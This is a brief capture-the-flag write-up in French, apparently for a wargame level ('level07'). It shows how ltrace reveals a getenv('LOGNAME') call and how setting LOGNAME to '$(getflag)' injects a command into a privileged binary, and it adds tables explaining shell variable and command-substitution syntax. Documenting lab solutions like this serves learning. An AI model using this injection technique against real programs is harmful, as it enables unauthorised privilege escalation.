
### Commandes réalisées
```bash
./level07
ltrace ./level07
export LOGNAME='$(getflag)'
./level07
```
### The Outputs
```bash
level07
getenv("LOGNAME")
```
### Exploit
```bash
export LOGNAME='$(getflag)'
```
* **`$(...)`** : Cette syntaxe permet d'exécuter une commande shell et d'insérer son **résultat** dans une chaîne de caractères.

| **Aspect**                 | **$variable** | **${variable}**                 |
| -------------------------- | ------------- | ------------------------------- |
| **Usages simples**         | Oui           | Oui                             |
| **Désambiguïsation**       | Non           | Oui                             |
| **Manipulations avancées** | Non           | Oui                             |
| **Noms complexes**         | Non           | Oui (ex. `${variable/old/new}`) |

| **Syntaxe**   | **Usage principal**                                     | **Exemple**                                             |
| ------------- | ------------------------------------------------------- | ------------------------------------------------------- |
| `$variable`   | Référencer une variable                                 | `echo $nom` (affiche la valeur de la variable `nom`)    |
| `${variable}` | Référencer une variable avec des manipulations avancées | `${nom/Alice/Bob}` remplace "Alice" par "Bob"           |
| `$()`         | Évaluer une commande et récupérer son résultat          | `date=$(date)` (stocke la sortie de `date` dans `date`) |
